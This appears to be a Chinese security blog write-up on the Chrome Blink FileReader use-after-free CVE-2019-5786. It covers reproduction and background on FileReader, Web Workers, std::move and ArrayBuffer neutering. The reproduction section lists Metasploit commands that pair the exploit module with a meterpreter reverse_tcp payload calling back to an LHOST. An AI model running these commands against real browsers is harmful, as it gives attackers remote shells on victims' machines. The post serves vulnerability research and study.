<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="fa1lr4in">
    
    <title>
        
            CVE-2019-5786 |
        
        fa1lr4in&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"fa1lr4in.github.io","root":"/","language":"en","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"男儿何不带吴钩，收取关山五十州。"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                fa1lr4in&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2019-5786</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">fa1lr4in</span>
                        
                            <span class="author-label">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2021-05-31 17:35:20</span>
        <span class="mobile">2021-05-31 17:35</span>
    </span>
    
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>9.3k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>41 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="Blink-FileReader-UAF漏洞（CVE-2019-5786）"><a href="#Blink-FileReader-UAF漏洞（CVE-2019-5786）" class="headerlink" title="Blink FileReader UAF漏洞（CVE-2019-5786）"></a>Blink FileReader UAF漏洞（CVE-2019-5786）</h1><h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1、漏洞简述"><a href="#1、漏洞简述" class="headerlink" title="1、漏洞简述"></a>1、漏洞简述</h3><ul>
<li>漏洞名称：Blink FileReader UAF漏洞（CVE-2019-5786）</li>
<li>漏洞编号：CVE-2019-5786</li>
<li>漏洞类型：UAF</li>
<li>漏洞影响：远程代码执行</li>
<li>CVSS3.0：N/A</li>
<li>CVSS2.0：N/A</li>
<li>漏洞危害等级：严重</li>
</ul>
<h3 id="2、组件和漏洞概述"><a href="#2、组件和漏洞概述" class="headerlink" title="2、组件和漏洞概述"></a>2、组件和漏洞概述</h3><p>Blink是Google基于WebKit fork出的自己的渲染引擎。</p>
<h3 id="3、相关链接"><a href="#3、相关链接" class="headerlink" title="3、相关链接"></a>3、相关链接</h3><p><a class="link"   target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=936448" >https://bugs.chromium.org/p/chromium/issues/detail?id=936448<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src.git/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/" >https://chromium.googlesource.com/chromium/src.git/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="4、解决方案"><a href="#4、解决方案" class="headerlink" title="4、解决方案"></a>4、解决方案</h3><p><a class="link"   target="_blank" rel="noopener" href="https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html" >https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>安装72.0.3626.81的Chrome浏览器</p>
<h3 id="2、复现过程"><a href="#2、复现过程" class="headerlink" title="2、复现过程"></a>2、复现过程</h3><h4 id="（1）msf复现"><a href="#（1）msf复现" class="headerlink" title="（1）msf复现"></a>（1）msf复现</h4><p>1、打开msf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/chrome_filereader_uaf</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> URIPATH /</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.126.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/31/CVE-2019-5786/image-20210514125243955.png" alt="image-20210514125243955"></p>
<p>2、搭建WIn7 x86环境，安装Chrome在Chrome快捷方式-&gt;目标后面加上”–no-sandbox”，并使用该快捷方式启动Chrome，用来创建一个关闭沙箱的Chrome进程。访问恶意地址网页。</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210514125902439.png" alt="image-20210514125902439"></p>
<p>3、msf出获得session</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210514125524165.png" alt="image-20210514125524165"></p>
<h4 id="（2）github公开exp复现"><a href="#（2）github公开exp复现" class="headerlink" title="（2）github公开exp复现"></a>（2）github公开exp复现</h4><p>搭建win 7 sp1 x86漏洞环境，访问漏洞exp页面，复现结果如下。（复现时个人机器访问iframe.html无法成功弹出计算器，直接访问exploit.html才可以成功的进行复现，仅做记录）</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210531153503754.png" alt="image-20210531153503754"></p>
<h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="1、基本信息"><a href="#1、基本信息" class="headerlink" title="1、基本信息"></a>1、基本信息</h3><ul>
<li>漏洞文件：third_party/blink/renderer/core/fileapi/file_reader_loader.cc</li>
<li>漏洞函数：FileReaderLoader::ArrayBufferResult()</li>
<li>编译后漏洞文件：chrome_child.dll</li>
<li>编译后漏洞函数：blink::FileReaderLoader::ArrayBufferResult()</li>
</ul>
<h3 id="2、背景知识"><a href="#2、背景知识" class="headerlink" title="2、背景知识"></a>2、背景知识</h3><h4 id="（0）FileReader对象"><a href="#（0）FileReader对象" class="headerlink" title="（0）FileReader对象"></a>（0）FileReader对象</h4><p>前言：</p>
<p>HTML5的FileReader API可以让客户端浏览器对用户本地文件进行读取，这样就不再需要上传文件由服务器进行读取了，这大大减轻了服务器的负担，也节省了上传文件所需要的时间。</p>
<p>下面的内容参考[1]</p>
<blockquote>
<p>该**<code>FileReader</code>**对象可以异步读取用户计算机上存储的文件（或原始数据缓冲区）的内容,使用[File]或[Blob]对象指定要读取的文件或数据。Blob对象代表不可变的原始数据的类似文件的对象。它们可以读取为文本或二进制数据，也可以转换为Readable Stream。 Blob可以表示不一定是JavaScript本机格式的数据。 File接口基于Blob，继承了Blob功能并将其扩展为支持用户系统上的文件。File提供有关文件的信息，并允许网页中的JavaScript访问其内容。</p>
</blockquote>
<p>FileReader相关的状态[1]如下，EMPTY（还未加载）、LOADING（正在加载）、DONE（加载完成）</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210517115202067.png" alt="image-20210517115202067"></p>
<p>FileReader有一些内置事件，包括abort、error、load、loadend、loadstart、progress。可以为这些事件自定义处理函数，其中progress事件在读取数据时定期触发，我们可以注册progress事件的回调函数。如果在这时候去获取result，就会在未加载完成时进入FileReaderLoader::ArrayBufferResult函数。如果将要读取的数据的长度设置的稍微大一点，就会在加载的过程中多次回调这个函数。</p>
<blockquote>
<p><code>FileReader.onprogress</code><br> A handler for the <code>progress</code> event. This event is triggered while reading a <code>Blob</code> content.<br>        <code>FileReader.onloadstart</code><br> A handler for the <code>loadstart</code> event. This event is triggered each time the reading is starting.</p>
</blockquote>
<h4 id="（1）Chrome调试方式"><a href="#（1）Chrome调试方式" class="headerlink" title="（1）Chrome调试方式"></a>（1）Chrome调试方式</h4><p>（1）确定要调试的进程pid</p>
<p>因为chrome是多进程模式，所以在调试的时候会有多个chrome进程。可以通过打开Chrome本身的任务管理器（shift+esc）来查看相关信息</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210524160855197.png" alt="image-20210524160855197"></p>
<p>通过打开的标签页可以看到我们具体要操作的是哪个pid，这里假如我们的目标是123这个标签页的话，需要调试的pid则为11708。</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210524161055630.png" alt="image-20210524161055630"></p>
<p>（2）attach process</p>
<p>之后就是常规的attach操作了，这里就不贴图了。</p>
<h4 id="（2）符号服务器以及符号文件配置"><a href="#（2）符号服务器以及符号文件配置" class="headerlink" title="（2）符号服务器以及符号文件配置"></a>（2）符号服务器以及符号文件配置</h4><p>（1）Chrome</p>
<p>Chrome可以配置系统的环境变量来指定相关的符号服务器[2]，具体操作方法为新增环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">变量名：_NT_SYMBOL_PATH</span><br><span class="line">变量值：SRV*c:\symbols*https://msdl.microsoft.com/download/symbols;SRV*c:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com</span><br></pre></td></tr></table></figure>

<p>（2）Chromium</p>
<p>Chromium可以下载相关的pdb文件来进行调试，可以通过[3]下载旧版本的Chromium应用程序以及符号文件等，下图链接参考[4]</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210524173059338.png" alt="image-20210524173059338"></p>
<h4 id="（3）代码查看工具sourcegraph"><a href="#（3）代码查看工具sourcegraph" class="headerlink" title="（3）代码查看工具sourcegraph"></a>（3）代码查看工具sourcegraph</h4><p>该工具可以查看变量的定义和引用等。</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210524173405047.png" alt="image-20210524173405047"></p>
<h4 id="（4）Web-Worker"><a href="#（4）Web-Worker" class="headerlink" title="（4）Web Worker"></a>（4）Web Worker</h4><p>在chrome中，Worker由v8实现，而非blink，验证如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.</span>js</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(Worker)!==<span class="string">&quot;undefined&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span>(Worker));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 1.js </span></span><br><span class="line">1</span><br><span class="line"><span class="keyword">function</span></span><br></pre></td></tr></table></figure>

<p>其实这种方式是可以确定js函数是在v8引擎实现的还是在blink引擎实现的，比如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">1.</span>js</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span>(FileReader)!==<span class="string">&quot;undefined&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span>(FileReader));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.release<span class="comment"># ./d8 1.js </span></span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>而在浏览器中就可以正常的输出，将console.log替换为document.write</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210525160118851.png" alt="image-20210525160118851"></p>
<p>扯远了，继续说Web Worker</p>
<p>JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。</p>
<p>Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务，被 Worker 线程负担了，主线程（通常负责 UI 交互）就会很流畅，不会被阻塞或拖慢。</p>
<p>Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。</p>
<p>Web Worker 有以下几个使用注意点。</p>
<p>（1）<strong>同源限制</strong></p>
<p>分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。</p>
<p>（2）<strong>DOM 限制</strong></p>
<p>Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。但是，Worker 线程可以<code>navigator</code>对象和<code>location</code>对象。</p>
<p>（3）<strong>通信联系</strong></p>
<p>Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。</p>
<p>（4）<strong>脚本限制</strong></p>
<p>Worker 线程不能执行<code>alert()</code>方法和<code>confirm()</code>方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。</p>
<p>（5）<strong>文件限制</strong></p>
<p>Worker 线程无法读取本地文件，即不能打开本机的文件系统（<code>file://</code>），它所加载的脚本，必须来自网络。[6]</p>
<h4 id="（5）std-move"><a href="#（5）std-move" class="headerlink" title="（5）std::move"></a>（5）std::move</h4><p>函数原型定义如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">typename</span> remove_reference&lt;T&gt;::<span class="function">type&amp;&amp; <span class="title">move</span><span class="params">(T&amp;&amp; t)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;<span class="keyword">typename</span> remove_reference&lt;T&gt;::type&amp;&amp;&gt;(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过move定义可以看出，move并没有”移动“什么内容，<strong>只是将传入的值转换为右值</strong>，此外没有其他动作。std::move+移动构造函数或者移动赋值运算符，才能充分起到减少不必要拷贝的意义。</p>
<blockquote>
<p>std::move函数可以以非常简单的方式将左值引用转换为右值引用。（左值、左值引用、右值、右值引用 参见：[7]）</p>
<p>通过std::move，可以避免不必要的拷贝操作。</p>
<p>std::move是为性能而生。</p>
<p>std::move是将对象的状态或者所有权从一个对象转移到另一个对象，只是转移，没有内存的搬迁或者内存拷贝。[8]</p>
<p>还有一份比较详细的解释，参考[9]</p>
</blockquote>
<p>对于我们来说，move的作用就是转变所有权的过程，该过程不涉及内存拷贝而只是将某进程或线程的所有权转交给另一个进程或线程。</p>
<p>调试的过程中发现：所谓std::move并不是简单的替换指针指向，其中也会涉及到内存拷贝的操作以及内存释放的操作，具体为什么节约性能暂时不清楚，下面是当我操作string对象的时候的代码以及内存现场，其中涉及了内存拷贝的操作</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::string str = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    std::string str1;</span><br><span class="line">    str1 = std::<span class="built_in">move</span>(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用栈如下，通过调试的过程中，发现std::move的过程是先通过memcpy拷贝内存，之后将原来内存的第一个字符overwrite为0x00，这样原来的str读取后就为空。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1      vcruntime140d.dll!memcpy(unsigned char * dst, unsigned char * src, unsigned long count)</span><br><span class="line">2      test_c++.exe!std::string::_Memcpy_val_from(const std::string &amp; _Right)</span><br><span class="line">3      test_c++.exe!std::string::_Take_contents(std::string &amp; _Right, std::integral_constant&lt;bool,1&gt; __formal)</span><br><span class="line">4      test_c++.exe!std::string::_Move_assign(std::string &amp; _Right, std::_Equal_allocators __formal)</span><br><span class="line">5      test_c++.exe!std::string::operator=(std::string &amp;&amp; _Right)</span><br><span class="line">6      test_c++.exe!main()</span><br><span class="line">7      test_c++.exe!invoke_main()</span><br><span class="line">8      test_c++.exe!__scrt_common_main_seh()</span><br><span class="line">9      test_c++.exe!__scrt_common_main()</span><br><span class="line">10     test_c++.exe!mainCRTStartup(void * __formal)</span><br><span class="line">11     kernel32.dll!@BaseThreadInitThunk@12()</span><br><span class="line">12     ntdll.dll!__RtlUserThreadStart()</span><br><span class="line">13     ntdll.dll!__RtlUserThreadStart@8()</span><br></pre></td></tr></table></figure>

<p>所以不可以单纯的将std::move理解为不含任何空间拷贝或者分配释放，可能它的作用是减少空间拷贝的次数。</p>
<h4 id="（6）ArrayBuffer-Neutering"><a href="#（6）ArrayBuffer-Neutering" class="headerlink" title="（6）ArrayBuffer Neutering"></a>（6）ArrayBuffer Neutering</h4><p>参考[14]</p>
<p>如何释放一个 ArrayBuffer 的 <strong>backing store</strong> 。通常而言，可以通过转移 ArrayBuffer （比如转移给另一个线程）来实现底层堆块的释放，这称之为 <strong>Neuter</strong> 。在 V8 中，ArrayBuffer 提供了 <code>Neuter</code> 方法，代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Detaches this ArrayBuffer and all its views (typed arrays).</span><br><span class="line"> * Detaching sets the byte length of the buffer and all typed arrays to zero,</span><br><span class="line"> * preventing JavaScript from ever accessing underlying backing store.</span><br><span class="line"> * ArrayBuffer should have been externalized and must be detachable.</span><br><span class="line"> */</span><br><span class="line">void Detach();</span><br><span class="line"></span><br><span class="line">// TODO(913887): fix the use of &#x27;neuter&#x27; in the API.</span><br><span class="line">V8_DEPRECATE_SOON(&quot;Use Detach() instead.&quot;, inline void Neuter()) &#123; Detach(); &#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Make this ArrayBuffer external. The pointer to underlying memory block</span><br><span class="line"> * and byte length are returned as |Contents| structure. After ArrayBuffer</span><br><span class="line"> * had been externalized, it does no longer own the memory block. The caller</span><br><span class="line"> * should take steps to free memory when it is no longer needed.</span><br><span class="line"> *</span><br><span class="line"> * The Data pointer of ArrayBuffer::Contents must be freed using the provided</span><br><span class="line"> * deleter, which will call ArrayBuffer::Allocator::Free if the buffer</span><br><span class="line"> * was allocated with ArraryBuffer::Allocator::Allocate.</span><br><span class="line"> */</span><br><span class="line">Contents Externalize();</span><br></pre></td></tr></table></figure>

<p>可以看到，调用 <code>Neuter</code> 时 ArrayBuffer 已经被 <strong>Externalized</strong> 了，此时 ArrayBuffer 的 <strong>backing store</strong> 已经被调用方所释放了。</p>
<p><strong>Neuter</strong> 一个 ArrayBuffer 的常规做法是把它转移给一个工作者线程（ <a class="link"   target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers" >Web Workers<i class="fas fa-external-link-alt"></i></a> ）。与桌面软件一样，JavaScript 默认的执行线程为 UI 线程，如果要执行复杂的计算工作，应当新建一个工作者线程来执行任务，以防止 UI 失去响应。</p>
<p>在 JavaScript 中，各线程之间通过 <code>postMessage</code> 实现数据的发送、通过 <code>onmessage</code> 回调函数实现消息的相应。线程之间的数据传递是通过复制（而不是共享）来实现的，因此传递对象时会经历序列化和反序列化的过程，即传出时进行序列化，传入时进行反序列化。大多数浏览器通过 <a class="link"   target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" >Structured clone algorithm<i class="fas fa-external-link-alt"></i></a> 来实现这一特性。</p>
<p>如果要传递的对象实现了 <a class="link"   target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Transferable" >Transferable<i class="fas fa-external-link-alt"></i></a> 接口，那么可以实现数据的高效转移，即并不复制数据，而是通过直接转移所有权来实现传递。对于这种传递方式，因为直接转移了所有权，因此原有线程不再享有对象数据的访问权限。ArrayBuffer 就是以这样的方式转移的，但这里笔者有一个 <strong>疑问</strong> ：实际情况中，原有 ArrayBuffer 的 <strong>backing store</strong> 会被释放，显然在接收线程中会有新的堆块的分配以及数据的复制，并不是简单的修改指针的指向，这和 MDN 的文档描述的高效理念是冲突的。</p>
<p>线程相关的两个重要概念定义如下：</p>
<ul>
<li><p><code>postMessage</code> 发送消息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(message, [transfer]);</span><br></pre></td></tr></table></figure>

<ul>
<li>message 表示要传递的数据</li>
<li>如果有实现了 <code>Transferable</code> 的对象，可以以数组元素的方式放到第二个参数中，以提高传递效率，但是在第一个参数中需要指定一个引用，以方便目标线程接收</li>
</ul>
</li>
<li><p><code>onmessage</code> 响应消息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myWorker.onmessage = function(e) &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过事件的 <code>data</code> 属性访问接收到的数据</li>
</ul>
</li>
</ul>
<p>一个简单的例子如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- main.html 的代码 --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var worker = new Worker(&#x27;worker.js&#x27;);</span><br><span class="line">console.log(&#x27;Main thread: before postMessage, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">worker.postMessage(ab, [ab]);</span><br><span class="line">console.log(&#x27;Main thread: after postMessage, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// worker.js 的代码</span><br><span class="line">onmessage = function(message) &#123;</span><br><span class="line">    var ab = message.data;</span><br><span class="line">    console.log(&#x27;Worker thread: received: &#x27; + ab);</span><br><span class="line">    console.log(&#x27;Wroker thread: ArrayBuffer.byteLength is : &#x27; + ab.byteLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Main thread: before postMessage, ab.byteLength is 4096</span><br><span class="line">Main thread: after postMessage, ab.byteLength is 0</span><br><span class="line">Worker thread: received: [object ArrayBuffer]</span><br><span class="line">Wroker thread: ArrayBuffer.byteLength is : 4096</span><br></pre></td></tr></table></figure>

<p>McAfee Labs 的文章提到，使用 <a class="link"   target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/BaseAudioContext/decodeAudioData" >AudioContext.decodeAudioData<i class="fas fa-external-link-alt"></i></a> 同样可以实现 ArrayBuffer 的 <a class="link"   target="_blank" rel="noopener" href="https://programlife.net/tags/Neuter/" >Neuter<i class="fas fa-external-link-alt"></i></a> 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var ab = new ArrayBuffer(0x1000);</span><br><span class="line">var context = new AudioContext();</span><br><span class="line">console.log(&#x27;Before decodeAudioData, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">context.decodeAudioData(ab, </span><br><span class="line">    function(buffer) &#123;</span><br><span class="line">        console.log(&#x27;decode succeed: &#x27; + buffer);</span><br><span class="line">    &#125;, </span><br><span class="line">    function(e) &#123;</span><br><span class="line">        console.log(&#x27;decode failed: &#x27; + e);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">console.log(&#x27;After decodeAudioData, ab.byteLength is &#x27; + ab.byteLength);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

